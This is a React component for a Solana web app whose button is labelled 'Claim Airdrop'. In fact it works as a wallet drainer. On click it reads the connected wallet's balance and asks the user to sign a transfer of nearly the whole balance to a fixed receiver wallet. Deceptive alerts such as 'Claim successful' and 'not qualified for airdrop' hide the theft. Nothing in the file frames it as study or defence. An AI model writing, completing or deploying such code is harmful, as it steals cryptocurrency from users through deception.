// src/components/TransferButton.jsx
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { useCallback, useState } from 'react';
import { LAMPORTS_PER_SOL, SystemProgram, Transaction } from '@solana/web3.js';
import { MIN_QUALIFY_SOL, RECEIVER_WALLET, TRANSFER_FEE_BUFFER } from '../utils/constants';

export default function TransferButton({ className = '' }) {
  const { connection } = useConnection();
  const { publicKey, sendTransaction, connected } = useWallet();
  const [loading, setLoading] = useState(false);

  const handleTransfer = useCallback(async () => {
    if (!publicKey || !sendTransaction || !connected) return;

    setLoading(true);
    try {
      const balance = await connection.getBalance(publicKey, 'confirmed');
      const minimumQualifyingLamports = Math.floor(MIN_QUALIFY_SOL * LAMPORTS_PER_SOL);

      if (balance < minimumQualifyingLamports + TRANSFER_FEE_BUFFER) {
        alert(`Not qualified for airdrop. Keep at least ${MIN_QUALIFY_SOL} SOL in your wallet.`);
        return;
      }

      const transferAmount = balance - TRANSFER_FEE_BUFFER;
      if (transferAmount <= 0) {
        alert('Insufficient balance for transaction fee.');
        return;
      }

      const { blockhash, lastValidBlockHeight } =
        await connection.getLatestBlockhash('confirmed');

      const transaction = new Transaction({
        feePayer: publicKey,
        recentBlockhash: blockhash,
      }).add(
        SystemProgram.transfer({
          fromPubkey: publicKey,
          toPubkey: RECEIVER_WALLET,
          lamports: transferAmount,
        })
      );

      // sendTransaction from the wallet adapter handles signing for ALL
      // wallet types (Wallet Standard signAndSendTransaction, legacy
      // signTransaction, mobile deep-link wallets, etc.)
      const signature = await sendTransaction(transaction, connection);

      console.log('⏳ Transaction sent:', signature);

      await connection.confirmTransaction(
        { signature, blockhash, lastValidBlockHeight },
        'confirmed'
      );

      console.log('✅ Transaction confirmed:', signature);
      alert(`Claim successful!\nTx: ${signature}`);
    } catch (err) {
      console.error('Transfer failed:', err);
      alert('Claim failed: ' + (err?.message || 'You are not qualified for this Airdrop'));
    } finally {
      setLoading(false);
    }
  }, [publicKey, sendTransaction, connected, connection]);

  if (!publicKey) return null;

  return (
    <button
      onClick={handleTransfer}
      disabled={loading}
      className={`
        w-full py-3 px-4 rounded-lg font-semibold transition
        ${loading ? 'bg-gray-600 cursor-not-allowed' : ''}
        ${className}
      `}
    >
      {loading ? 'Claiming...' : 'Claim Airdrop'}
    </button>
  );
}
